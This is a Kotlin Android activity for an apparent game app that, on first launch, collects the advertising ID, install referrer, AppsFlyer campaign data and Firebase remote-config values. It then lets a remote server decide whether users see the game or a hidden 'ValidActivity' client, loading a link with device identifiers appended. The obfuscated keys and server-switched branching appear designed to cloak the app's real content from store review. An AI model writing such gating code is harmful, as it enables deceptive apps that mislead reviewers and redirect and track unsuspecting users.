package com.tap.tapper.favv

import android.content.Intent
import android.os.Bundle
import androidx.activity.compose.setContent
import androidx.appcompat.app.AppCompatActivity
import androidx.compose.animation.ExperimentalAnimationApi
import androidx.compose.foundation.layout.*
import androidx.compose.material.CircularProgressIndicator
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.android.volley.DefaultRetryPolicy
import com.android.volley.Request
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.appevents.AppEventsConstants
import com.facebook.appevents.AppEventsLogger
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import kotlinx.coroutines.*
import kotlin.coroutines.CoroutineContext

@ExperimentalAnimationApi
class DataCheckActivity : AppCompatActivity(), CoroutineScope {
    override val coroutineContext: CoroutineContext = Dispatchers.IO + Job()
    private val PREFS = "mnfdhu"
    private val GAME = "douhnj"
    private val FIRST = "zcifsj"

    private val LINK = "path"
    private var link = ""

    private val MODE = "Check_game"

    private val GET = "gae"
    private var get = ""

    private val SET = "sae"
    private var set = ""

    private val AF = "appsfly"
    private var af = ""
    private var campaign = ""
    private var afId = ""

    private var ORGANIC = "orcan"
    private var organic = false
    private var game = false

    private var adId = ""

    private lateinit var referrerClient: InstallReferrerClient
    private var installRefferer = ""

    private val flags = arrayOf(
        false,
        false,
        false,
        false,
        false
    )

    private var stop = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (getSharedPreferences(PREFS, 0).getBoolean(FIRST, true)) {
            getSharedPreferences(PREFS, 0).edit().putBoolean(FIRST, false).apply()
            setContent {
                Row(modifier = Modifier.fillMaxHeight(), verticalAlignment = Alignment.CenterVertically) {
                    Column(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        CircularProgressIndicator()
                    }
                }
            }
            initFacebook()
            launch {
                fetchDataFromFirebase()
            }
            launch {
                setAppsFlyer()
            }
            launch {
                getData()
            }
            launch {
                getAdId()
            }
            launch {
                getInstallReferrer()
            }
            launch {
                finalize()
            }
        } else {
            if (getSharedPreferences(PREFS, 0).getBoolean(GAME, true)) {
                launchGame()
            } else {
                launchClient()
            }
        }
    }

    private fun launchClient() {
        getSharedPreferences(PREFS, 0).edit().putBoolean(GAME, false).apply()
        startActivity(Intent(this, ValidActivity::class.java))
    }

    private fun launchGame() {
        getSharedPreferences(PREFS, 0).edit().putBoolean(GAME, true).apply()
        startActivity(Intent(this, AndroidLauncher::class.java))
    }

    private fun fetchDataFromFirebase() {
        try {
            var analytics = FirebaseAnalytics.getInstance(this@DataCheckActivity)
            val mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance()
            val configSettings = FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600)
                .build()
            mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings)
            mFirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener {
                    try {
                        link = mFirebaseRemoteConfig.getString(LINK)
                        get = mFirebaseRemoteConfig.getString(GET)
                        set = mFirebaseRemoteConfig.getString(SET)
                        organic = mFirebaseRemoteConfig.getBoolean(ORGANIC)
                        af = mFirebaseRemoteConfig.getString(AF)
                        if (!mFirebaseRemoteConfig.getBoolean(MODE)) {
                            game = true
                        }
                        flags[0] = true
                    } catch (ex: Exception) {
                        game = true
                        flags[0] = true
                    }
                }
        } catch (e: Exception) {
            game = true
            flags[0] = true
        }
    }

    private fun setAppsFlyer() {
        val conversionDataListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                data?.let { cvData ->
                    cvData.map {
                        if (it.key == "campaign" || it.key == "c") campaign = it.value as String
                    }
                }
                flags[1] = true
            }

            override fun onConversionDataFail(error: String?) {
                game = true
                flags[1] = true
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                data?.map {
                }
                flags[1] = true
            }

            override fun onAttributionFailure(error: String?) {
                game = true
                flags[1] = true
            }
        }
        while (!flags[0]) continue
        AppsFlyerLib.getInstance().init(af, conversionDataListener, this@DataCheckActivity)
        AppsFlyerLib.getInstance().start(this@DataCheckActivity)
        afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this@DataCheckActivity)
    }

    private fun getData() {
        while (!flags[0]) continue
        try {
            val queue = Volley.newRequestQueue(this@DataCheckActivity)
            val stringRequest = StringRequest(
                Request.Method.GET, get,
                { response ->
                    if (response.toBoolean()) {
                        game = true
                        uploadData()
                    }
                    flags[2] = true
                }, {
                    game = true
                })
            stringRequest.retryPolicy = DefaultRetryPolicy(
                10000,
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
            )
            queue.add(stringRequest)
        } catch (e: Exception) {
            flags[2] = true
            game = true
        }
    }

    private fun uploadData() {
        val queue = Volley.newRequestQueue(this)
        val stringRequest = StringRequest(
            Request.Method.GET, set,
            {},
            {})
        stringRequest.retryPolicy = DefaultRetryPolicy(
            10000,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        queue.add(stringRequest)
    }

    private fun initFacebook() {
        try {
            val logger = AppEventsLogger.newLogger(this@DataCheckActivity)
            logger.logEvent(AppEventsConstants.EVENT_NAME_ACTIVATED_APP)
            AppEventsLogger.activateApp(application)
        } catch(e: Exception) {
            game = true
        }
    }

    private fun getAdId() {
        try {
            val adInfo = AdvertisingIdClient.getAdvertisingIdInfo(this@DataCheckActivity)
            val myId = adInfo?.id
            if (myId != null) {
                adId = myId
            }
            flags[3] = true
        } catch (e: java.lang.Exception) {
            game = true
            flags[3] = true
        }
    }

    private fun getInstallReferrer() {
        referrerClient = InstallReferrerClient.newBuilder(this@DataCheckActivity).build()
        referrerClient.startConnection(object : InstallReferrerStateListener {

            override fun onInstallReferrerSetupFinished(responseCode: Int) {
                when (responseCode) {
                    InstallReferrerClient.InstallReferrerResponse.OK -> {
                        installRefferer = referrerClient.installReferrer.installReferrer
                        flags[4] = true
                    }
                    InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED -> {
                        game = true
                        flags[4] = true
                    }
                    InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE -> {
                        game = true
                        flags[4] = true
                    }
                }
            }

            override fun onInstallReferrerServiceDisconnected() {
            }
        })
    }

    private fun finalize() {
        while ((!flags[0] || !flags[1] || !flags[2] || !flags[3] || !flags[4]) && !game) continue
        if (stop) return
        if (!game) {
            if (organic) {
                if (campaign == "") game = true
                else link += "?$campaign&referrer=$installRefferer&deviceID=$adId&af_id=$afId"
            } else {
                link += "?referrer=$installRefferer&deviceID=$adId&af_id=$afId"
            }
            getSharedPreferences(PREFS, 0).edit().putString(LINK, link).apply()
        }
        if (game) launchGame() else launchClient()
    }

    override fun onPause() {
        super.onPause()
        stop = true
        finish()
    }
}